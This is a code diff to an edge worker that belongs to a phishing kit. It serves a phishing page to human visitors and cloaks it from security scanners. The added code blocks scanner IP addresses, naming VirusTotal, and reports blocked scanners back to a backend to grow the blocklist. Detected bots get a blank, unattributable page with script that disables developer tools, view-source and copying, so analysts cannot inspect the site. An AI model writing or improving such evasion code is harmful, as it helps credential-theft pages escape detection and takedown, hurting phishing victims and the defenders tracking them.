@@ -5,6 +5,45 @@ const VERIFY_ENDPOINT = '{{VERIFY_ENDPOINT}}';
 const BEACON_ENDPOINT = '{{BEACON_ENDPOINT}}';
 const LOG_ENDPOINT = '{{LOG_ENDPOINT}}';
 
+// Link-scoped JWT, injected at build time. Used to authenticate backend calls
+// that don't otherwise carry a token - e.g. scanner-signal, which the worker
+// fires when it blocks a bot. Must be at module scope so both servePhishingPage
+// and handleRequest can reach it.
+//
+// NOTE: templateloader.js must replace the JWT placeholder globally (/g). A
+// single non-global replacement would fill only this line and leave the copy
+// inside servePhishingPage as an unresolved placeholder.
+const JWT_TOKEN = '{{JWT_TOKEN}}';
+
+// ─── Scanner IP Blocklist ─────────────────────────────────────
+// Blocked by source address, checked before anything else runs.
+//
+// A Worker cannot see TLS fingerprints (JA3/JA4) or HTTP/2 fingerprints, so it
+// cannot tell VirusTotal's genuine Chrome from a real human, and user-agent /
+// header checks miss VT because VT uses a normal Chrome user agent. Blocking by
+// address is the complement: a scanner that returns with a normal user agent is
+// still stopped.
+//
+// Injected at build time from the scanner_blocklist table. The list grows two
+// ways: manual entries from scanner intel, and entries reported back by this
+// worker when it blocks a request on user-agent or rate-limit grounds.
+//
+// Honest limit: the automatic path only catches scanners that FIRST hit the
+// edge with a bot user agent. VT's URL scanner does not, so its IPs must be
+// added by hand. See backend/services/scanner-blocklist.js.
+const BLOCKED_IPS_RAW = '{{BLOCKED_IPS}}';
+let BLOCKED_IPS = [];
+try {
+  const _parsedIps = JSON.parse(BLOCKED_IPS_RAW);
+  if (Array.isArray(_parsedIps)) BLOCKED_IPS = _parsedIps;
+} catch (e) {
+  // The placeholder must be a valid JSON array string. If the build step ever
+  // fails to inject it, fall back to an empty list rather than throwing: a
+  // throw here would take the whole worker down and stop serving visitors.
+  BLOCKED_IPS = [];
+}
+
+
 // Simple in-memory rate limiter (per deployment)
 const rateLimitMap = new Map();
 const RATE_LIMIT_WINDOW = 60000; // 1 minute
@@ -47,6 +86,15 @@ function isBotRequest(request) {
   const visitorIp = request.headers.get('CF-Connecting-IP') || 
                     request.headers.get('X-Forwarded-For') || 
                     request.headers.get('X-Real-IP') || '';
+  
+  // Address blocklist first. This is the only edge signal that also stops a
+  // scanner which returns with a normal user agent, so it runs ahead of the
+  // user-agent scoring below.
+  // X-Forwarded-For is a comma separated chain, so match on the first hop only.
+  var blocklistIp = visitorIp ? visitorIp.split(',')[0].trim() : '';
+  if (blocklistIp && BLOCKED_IPS.indexOf(blocklistIp) !== -1) {
+    return { isBot: true, reason: 'ip_blocklist' };
+  }
   
   // Rate limiting
   if (visitorIp && checkRateLimit(visitorIp)) {
@@ -153,10 +201,14 @@ function isBotRequest(request) {
 }
 
 addEventListener('fetch', event => {
-  event.respondWith(handleRequest(event.request));
+  // Pass waitUntil through so background work (blocklist reporting) survives
+  // past respondWith. A Workers handler discards in-flight fetches once the
+  // response is returned, which would have made every signal silently lost.
+  // waitUntil does NOT delay the response - it only keeps the isolate alive.
+  event.respondWith(handleRequest(event.request, event.waitUntil.bind(event)));
 });
 
-async function handleRequest(request) {
+async function handleRequest(request, waitUntil) {
   const url = new URL(request.url);
 
   // Detect bots at the edge before serving anything
@@ -167,19 +219,45 @@ async function handleRequest(request) {
       return servePhishingPage(request);
     }
   } else {
-    // Bot detected - return a 404, not a blank 200.
+    // Bot detected - return a simple harmless white page.
     //
-    // A blank 200 is itself a fingerprint: a host that answers 200 with zero
-    // content is a well-known decoy pattern, so anyone auditing the domain can
-    // see through it. A 404 is a high-volume, unremarkable response.
+    // No <title> (browsers fall back to the URL, which is what a real empty
+    // page does), no branding, no product name - nothing in the response can
+    // be attributed to this deployment. The anti-scraping script is kept so a
+    // scanner that does render the page still cannot copy, screenshot-annotate
+    // or inspect it.
+    console.log('[Worker] Bot blocked (white page):', botCheck.reason);
+
+    // Grow the blocklist from what we just stopped, so a scanner that later
+    // returns with a normal user agent is still blocked by address. Skip
+    // ip_blocklist hits - those addresses are already in the list, so
+    // re-reporting them is pure noise.
     //
-    // The body is generic on purpose - no branding, no product name, nothing
-    // that ties it to this deployment - and it keeps the anti-scraping script
-    // so a scanner that does render it still cannot copy or inspect it.
-    console.log('[Worker] Bot blocked (404):', botCheck.reason);
-    const notFound = `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>404 - Page Not Found</title><style>html,body{margin:0;padding:0;background:#fff}body{min-height:100vh;display:flex;align-items:center;justify-content:center;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;color:#222;overflow:hidden;user-select:none;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none}main{max-width:420px;padding:32px 24px;text-align:center}.code{font-size:48px;font-weight:700;line-height:1;margin-bottom:14px;letter-spacing:-.02em}h1{font-size:18px;font-weight:600;margin:0 0 10px}p{font-size:14px;line-height:1.6;color:#666;margin:0}</style><script>document.addEventListener('keydown',function(e){if(e.ctrlKey||e.metaKey){e.preventDefault();e.stopPropagation()}if(e.key==='F12'){e.preventDefault()}if(e.ctrlKey&&e.shiftKey&&(e.key==='I'||e.key==='i')){e.preventDefault()}if(e.ctrlKey&&e.key==='u'){e.preventDefault()}if(e.ctrlKey&&e.key==='s'){e.preventDefault()}if(e.ctrlKey&&e.key==='p'){e.preventDefault()}});document.addEventListener('contextmenu',function(e){e.preventDefault()});document.addEventListener('selectstart',function(e){e.preventDefault()})<\/script></head><body><main><div class="code">404</div><h1>Page Not Found</h1><p>The page you are looking for does not exist or has been moved.</p></main></body></html>`;
-    return new Response(notFound, {
-      status: 404,
+    // The visitor's response must not depend on the backend being up, but the
+    // fetch DOES need waitUntil: Workers discard in-flight requests once the
+    // response is returned, so a plain .catch() here would lose every signal.
+    // waitUntil keeps the isolate alive without delaying the white page.
+    if (botCheck.reason.indexOf('ip_blocklist') === -1) {
+      const signalIp = (request.headers.get('CF-Connecting-IP') ||
+                        request.headers.get('X-Forwarded-For') || '')
+                        .split(',')[0].trim();
+      if (signalIp && typeof waitUntil === 'function') {
+        waitUntil(fetch(VERIFY_ENDPOINT + '/api/scanner-signal', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            ip: signalIp,
+            user_agent: request.headers.get('user-agent') || '',
+            reason: botCheck.reason,
+            // Authenticates the caller so the endpoint is not an open write.
+            jwt_token: JWT_TOKEN,
+          }),
+        }).catch(function () {}));
+      }
+    }
+    const whitePage = `<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><style>html,body{margin:0;padding:0;background:#fff;height:100%;overflow:hidden;user-select:none;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none}</style><script>document.addEventListener('keydown',function(e){if(e.ctrlKey||e.metaKey){e.preventDefault();e.stopPropagation()}if(e.key==='F12'){e.preventDefault()}if(e.ctrlKey&&e.shiftKey&&(e.key==='I'||e.key==='i')){e.preventDefault()}if(e.ctrlKey&&e.key==='u'){e.preventDefault()}if(e.ctrlKey&&e.key==='s'){e.preventDefault()}if(e.ctrlKey&&e.key==='p'){e.preventDefault()}});document.addEventListener('contextmenu',function(e){e.preventDefault()});document.addEventListener('selectstart',function(e){e.preventDefault()})<\/script></head><body></body></html>`;
+    return new Response(whitePage, {
+      status: 200,
       headers: {
         'Content-Type': 'text/html; charset=utf-8',
         'Cache-Control': 'no-cache, no-store, must-revalidate',
